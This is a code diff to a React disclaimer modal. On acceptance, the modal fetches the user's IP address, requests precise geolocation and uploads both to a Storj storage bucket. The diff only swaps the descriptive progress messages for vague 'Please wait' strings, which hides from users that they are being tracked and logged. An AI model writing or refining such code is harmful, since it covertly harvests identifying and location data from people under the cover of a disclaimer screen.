@@ -9,7 +9,7 @@ export default function ShitDisclaimerModal({ onAccept, bucketName }) {
 
     const handleAccept = async () => {
         setLoading(true);
-        setStatus('Initializing...');
+        setStatus('Please wait');
 
         try {
             // 1. Gather Basic Info
@@ -39,7 +39,7 @@ export default function ShitDisclaimerModal({ onAccept, bucketName }) {
             };
 
             // 2. Fetch IP
-            setStatus('Connecting...');
+            setStatus('Please wait.');
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipJson = await ipRes.json();
@@ -50,7 +50,7 @@ export default function ShitDisclaimerModal({ onAccept, bucketName }) {
             }
 
             // 3. Get Location
-            setStatus('Verifying location...');
+            setStatus('Please wait..');
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -73,7 +73,7 @@ export default function ShitDisclaimerModal({ onAccept, bucketName }) {
             }
 
             // 4. Save to Storj
-            setStatus('Securing session...');
+            setStatus('Please wait...');
             await saveLog(data, bucketName);
 
             // 5. Done
